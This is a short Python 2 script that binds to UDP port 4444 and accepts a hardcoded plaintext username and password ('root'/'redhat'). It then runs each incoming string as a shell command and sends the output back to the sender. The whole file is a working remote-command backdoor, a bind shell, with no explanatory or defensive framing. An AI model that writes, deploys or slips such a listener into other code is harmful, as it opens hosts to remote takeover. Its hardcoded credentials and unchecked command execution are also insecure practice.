#!/bin/python

import socket,commands
s=socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
s.bind(("",4444))
data=s.recvfrom(100)
data1=s.recvfrom(100)

if data[0] == "root" and data1[0] == "redhat":
	s.sendto("connected",data[1])
	while True:
	  rcmd=s.recvfrom(100)[0]
	  output=commands.getoutput(rcmd)
	  s.sendto(output,data[1])
else:
	  s.sendto("not connected",data[1])


